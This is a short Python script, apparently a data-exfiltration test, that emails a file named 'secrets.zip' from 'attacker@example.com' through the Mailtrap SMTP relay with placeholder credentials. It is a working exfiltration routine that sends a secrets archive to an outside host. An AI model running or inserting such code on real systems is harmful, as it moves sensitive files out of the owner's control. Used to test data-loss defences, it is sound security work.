import smtplib
from email.message import EmailMessage

msg = EmailMessage()
msg['Subject'] = 'Exfil Test'
msg['From'] = 'attacker@example.com'
msg['To'] = 'receiver@mailtrap.io'
msg.set_content('See attached.')

with open('secrets.zip', 'rb') as f:
    msg.add_attachment(f.read(), maintype='application', subtype='zip', filename='secrets.zip')

smtp = smtplib.SMTP('smtp.mailtrap.io', 587)
smtp.starttls()
smtp.login('MAUL_ACCOUNT', 'MAIL_PASSWORD')
smtp.send_message(msg)
smtp.quit()